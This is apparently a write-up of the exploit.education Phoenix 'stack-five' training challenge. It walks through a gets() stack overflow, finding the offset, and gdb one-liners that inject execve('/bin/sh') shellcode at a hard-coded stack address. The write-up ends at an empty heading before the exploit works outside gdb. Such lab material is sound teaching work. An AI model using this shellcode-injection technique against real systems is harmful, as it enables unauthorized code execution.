# Challenge Source Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

  char *gets(char *);

  void start_level() {
        char buffer[128];
          gets(buffer);
  }

  int main(int argc, char **argv) {
        printf("%s\n", BANNER);
          start_level();
  }
```
# Challenge Summary
Its a classic overflow with shellcode. Overflow the saved instruction pointer and then point to the stack containing the code.
# Challenge Theory
For this challenge it is a simple buffer overflow with a 128 bit buffer. This means a few things. 
First, the shellcode can only be 136 bytes long(still a lot of space). 
Second, the shellcode also has to ideally be null free given it comes form stdin.
Finally, with this in mind it is time to find the offset.
# Identifying the Vulnerability
To find the proper offset a currently unknown amount of characters needs to be sent into the program. For this I used a combination of pwntools cyclic() and just sending in input manually.
First manual input was used to find an overflow.
This ends up being 144 characters for overwriting the saved instruction pointer on the stack.
# Overwriting the Saved Instruction Pointer
Using pwn cyclic the pattern shown below can be generated:
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaab
```
Putting this into a debugged session as input to the stack-five program will net.
```
$rip = 0x6261616b6261616a = "jaabkaab"
```
This reveals a 3 things.
First, the final 8 bytes of the 144 byte pattern is what controls the $rip register.
Second, the padding for the control is 136 bytes.
Third, the shellcode has to be a maximum of 136 bytes if the exploit is to be kept in the local stack frame.
# Gathering more information
There are a few more pieces of information needed to write a very basic exploit.
The register of the buffer itself is actually needed to know where to point the instruction pointer.
Running one more debugging session with just one "a" for input will net:
```
$rbp-0x80 = 0x7fffffffe5b0 
$rsp = 0x7fffffffe5b0 
```
In this extremely simple program the $rsp and $rbp-0x80 are pointing to the same address.
This is why both registers were included.
Now all of the information required to write a basic exploit is acquired.
# Writing a basic exploit
To write a basic exploit a small oneliner with an int3 SIGTRAP will be used.
This should look like:
```
python2 -c 'print b"\xCC" + b"A"*135 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"'
run <<< $(python2 -c 'print b"\xCC" + b"A"*135 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"')
```
Quick note the run <<< ... command is the actual command being run in gdb
# Fully Fledged Exploit in GDB
For the fully fledged exploit some shellcode is needed.
For this some shellcode from shellstorm will be used.
## Shellcode
```
; uncompiled
xor eax, eax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall

; compiled hex bytes
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```
## Writing a Basic One Liner
```
python2 -c 'print b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"A"*109 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"'
run <<< $(python2 -c 'print b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"A"*109 + b"\xb0\xe5\xff\xff\xff\x7f\x00\x00"')
```
Running this in the gdb session will net an attempt at running /bin/sh or in this case /bin/dash because /bin/sh points to that.
This will also fail because gdb has a bunch of environment varaibles unset in order to facilitate debugging.
# Testing the Exploit Outside of GDB
Now the current exploit strategy has to be tested outside of gdb in order to verify a fully fledged exploit.
To do this the previous SIGTRAP one liner will be used and will be piped into the program outside of gdb.
When running the one liner this output is produced:
```
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Illegal instruction
```
This means the exploit needs more work.
# Building the Working Exploit Outside of GDB

